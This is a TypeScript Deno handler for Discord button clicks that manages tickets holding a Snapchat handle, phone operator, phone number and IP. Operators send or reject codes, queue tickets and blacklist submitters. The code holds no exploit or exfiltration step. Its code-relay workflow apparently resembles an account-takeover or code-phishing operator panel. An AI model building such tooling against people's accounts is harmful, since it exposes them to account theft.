import { createClientFromRequest } from 'npm:@base44/sdk@0.8.31';

const BOT_TOKEN = Deno.env.get("DISCORD_BOT_TOKEN");
const DISCORD_PUBLIC_KEY = Deno.env.get("DISCORD_PUBLIC_KEY");
const GUILD_ID = "1512395679392202793";
const CHANNEL_ID = "1512395679958302843";

async function verifyDiscordSignature(req: Request, body: string): Promise<boolean> {
  const signature = req.headers.get("x-signature-ed25519");
  const timestamp = req.headers.get("x-signature-timestamp");
  if (!signature || !timestamp || !DISCORD_PUBLIC_KEY) return false;

  try {
    const key = await crypto.subtle.importKey(
      "raw",
      hexToUint8Array(DISCORD_PUBLIC_KEY),
      { name: "Ed25519", namedCurve: "Ed25519" },
      false,
      ["verify"]
    );
    const data = new TextEncoder().encode(timestamp + body);
    const sig = hexToUint8Array(signature);
    return await crypto.subtle.verify("Ed25519", key, sig, data);
  } catch {
    return false;
  }
}

function hexToUint8Array(hex: string): Uint8Array {
  const pairs = hex.match(/.{1,2}/g) || [];
  return new Uint8Array(pairs.map(b => parseInt(b, 16)));
}

async function createPrivateThread(submissionId: string, adminDiscordId: string, snapchat: string, operateur: string): Promise<string | null> {
  // Create private thread in the channel
  const threadRes = await fetch(`https://discord.com/api/v10/channels/${CHANNEL_ID}/threads`, {
    method: "POST",
    headers: {
      "Authorization": `Bot ${BOT_TOKEN}`,
      "Content-Type": "application/json"
    },
    body: JSON.stringify({
      name: `🎫 ${snapchat} — ${operateur}`,
      type: 12, // PRIVATE_THREAD
      invitable: false,
      auto_archive_duration: 1440
    })
  });

  if (!threadRes.ok) {
    console.error("Thread creation failed:", await threadRes.text());
    return null;
  }

  const threadData = await threadRes.json();
  const threadId = threadData.id;

  // Add admin as member
  await fetch(`https://discord.com/api/v10/channels/${threadId}/thread-members/${adminDiscordId}`, {
    method: "PUT",
    headers: { "Authorization": `Bot ${BOT_TOKEN}` }
  });

  // Send welcome message in thread
  await fetch(`https://discord.com/api/v10/channels/${threadId}/messages`, {
    method: "POST",
    headers: {
      "Authorization": `Bot ${BOT_TOKEN}`,
      "Content-Type": "application/json"
    },
    body: JSON.stringify({
      content: `<@${adminDiscordId}> 👋 Tu as pris en charge ce ticket **@${snapchat}** (${operateur}).\nLes mises à jour arriveront ici automatiquement.`
    })
  });

  return threadId;
}

async function handleAction(base44: any, action: string, submissionId: string, adminDiscordId: string, ip?: string) {
  const statusMap = {
    send_code: "code_ready",
    wrong: "code_wrong",
    wait: "waiting_queue",
    blacklist: "code_wrong"
  };

  const newStatus = statusMap[action] || "pending";

  // Get submission data
  const sub = await base44.asServiceRole.entities.Submission.get(submissionId).catch(() => null);
  if (!sub) return;

  // Create thread if not exists
  let threadId = sub.thread_id;
  if (!threadId) {
    threadId = await createPrivateThread(submissionId, adminDiscordId, sub.snapchat, sub.operateur);
    if (threadId) {
      await base44.asServiceRole.entities.Submission.update(submissionId, {
        thread_id: threadId,
        admin_discord_id: adminDiscordId,
        status: newStatus
      });
    }
  } else {
    await base44.asServiceRole.entities.Submission.update(submissionId, { status: newStatus });
  }

  // If blacklist, also blacklist IP and phone
  if (action === "blacklist" && ip) {
    const decodedIp = decodeURIComponent(ip);
    await base44.asServiceRole.entities.BlacklistEntry.create({ value: decodedIp, type: "ip" }).catch(() => {});
    await base44.asServiceRole.entities.BlacklistEntry.create({ value: sub.telephone, type: "phone" }).catch(() => {});
  }

  // Send sendCode notification if needed
  if (action === "send_code") {
    await base44.functions.invoke("sendCode", { submissionId, action: "code_ready" }).catch(() => {});
  } else if (["wrong", "wait"].includes(action)) {
    await base44.functions.invoke("sendCode", { submissionId, action }).catch(() => {});
  }

  // Log action
  await base44.asServiceRole.entities.ActionLog.create({
    submission_id: submissionId,
    action: action === "send_code" ? "code_sent" : action === "wrong" ? "code_wrong" : action === "wait" ? "waiting_queue" : "rejected",
    admin_user: adminDiscordId,
    timestamp: new Date().toISOString()
  });
}

Deno.serve(async (req) => {
  try {
    const rawBody = await req.text();

    // Verify Discord signature
    const isValid = await verifyDiscordSignature(req, rawBody);
    if (!isValid) {
      return new Response("Invalid signature", { status: 401 });
    }

    const interaction = JSON.parse(rawBody);

    // Discord PING
    if (interaction.type === 1) {
      return Response.json({ type: 1 });
    }

    // Button interaction (type 3)
    if (interaction.type === 3) {
      const customId: string = interaction.data.custom_id;
      const adminDiscordId: string = interaction.member?.user?.id || interaction.user?.id;
      const parts = customId.split(":");
      const action = parts[0];
      const submissionId = parts[1];
      const ip = parts[2];

      // Acknowledge immediately (ephemeral)
      const ackResponse = Response.json({
        type: 7,
        data: {
          embeds: [{
            title: "⏳ Action en cours...",
            color: 0xFFAA00,
            description: "Le ticket est en cours de traitement."
          }],
          flags: 64
        }
      });

      // Process async
      const base44 = createClientFromRequest(req);
      handleAction(base44, action, submissionId, adminDiscordId, ip).catch(console.error);

      return ackResponse;
    }

    return Response.json({ type: 1 });
  } catch (error) {
    return Response.json({ error: error.message }, { status: 500 });
  }
});